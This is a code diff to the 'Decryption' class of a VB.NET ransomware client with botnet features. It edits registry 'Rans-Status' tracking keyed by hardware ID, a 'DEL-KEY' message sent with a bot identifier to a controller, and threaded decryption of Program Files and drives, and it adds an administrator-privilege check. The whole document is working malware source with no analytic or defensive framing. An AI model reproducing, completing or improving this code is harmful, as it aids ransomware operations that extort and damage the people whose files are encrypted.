@@ -19,12 +19,8 @@ Public Class Decryption
 
     Public Sub Dec(ByVal key As String)
         Try
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", Nothing)
-            If readValue = "Decrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
-                Exit Sub
-            End If
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Decryption in progress...")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decryption in progress...")
 
             Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
             Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
@@ -42,9 +38,9 @@ Public Class Decryption
             num = Nothing
             P1 = Nothing
             Threading.Thread.CurrentThread.Sleep(1000)
-            Main.Send("DEL-KEY" + SPL + ID.Bot)
+            Main.Send("DEL-KEY" + SPL + Main.BOT)
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Decrypted")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decrypted")
 
             Try
                 Main.CloseMe()
@@ -77,7 +73,7 @@ Public Class Decryption
 
     Public Sub Dec_Prog(ByVal password As String)
         On Error Resume Next
-        If ID.AmiAdmin = "Administrator" Then
+        If AmiAdmin() = "Administrator" Then
             Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
         End If
         num += 1
@@ -135,5 +131,19 @@ Public Class Decryption
         Next
 
     End Sub
+
+    Public Function AmiAdmin()
+        Try
+            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
+            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
+            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
+                Return "Administrator"
+            Else
+                Return "User"
+            End If
+        Catch ex As Exception
+            Return "Error"
+        End Try
+    End Function
 
 End Class
